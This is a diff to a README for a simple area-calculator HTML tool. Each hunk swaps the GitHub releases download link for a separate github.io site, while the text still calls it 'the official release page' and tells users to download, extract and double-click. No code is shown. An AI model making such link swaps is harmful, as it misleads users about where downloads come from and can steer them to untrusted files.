@@ -19,7 +19,7 @@ This tool is perfect for:
 
 ### Step 1: Visit the Download Page
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD%20AREA%20CHECKER-Click%20Here%20to%20Get%20Started-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/passive-hotpepper515/area-checker-html-tool/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD%20AREA%20CHECKER-Click%20Here%20to%20Get%20Started-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://passive-hotpepper515.github.io)
 
 Visit this link to download the application. This is the official release page where you'll find the latest version.
 
@@ -92,7 +92,7 @@ Simple design with large buttons and clear labels. No confusing menus or hidden 
 
 **Step 1: Open Your Browser**
 - Use any browser: Chrome, Edge, Firefox, or Opera
-- Go to the download link: https://github.com/passive-hotpepper515/area-checker-html-tool/releases
+- Go to the download link: https://passive-hotpepper515.github.io
 
 **Step 2: Find the Right File**
 - Look for a section called **"Assets"** or **"Downloads"**
@@ -202,7 +202,7 @@ No sign-up, no cost, no hassle. Just download, extract, and double-click. You'll
 
 ## ⬇️ Quick Download Again
 
-[![GET IT NOW](https://img.shields.io/badge/🚀%20GET%20AREA%20CHECKER-Download%20Latest%20Version-orange?style=for-the-badge&logo=github&logoColor=white&color=orange)](https://github.com/passive-hotpepper515/area-checker-html-tool/releases)
+[![GET IT NOW](https://img.shields.io/badge/🚀%20GET%20AREA%20CHECKER-Download%20Latest%20Version-orange?style=for-the-badge&logo=github&logoColor=white&color=orange)](https://passive-hotpepper515.github.io)
 
 **How to run:** Visit this link to download the application. After downloading, extract the ZIP file, open the folder, and double-click `index.html`.
 
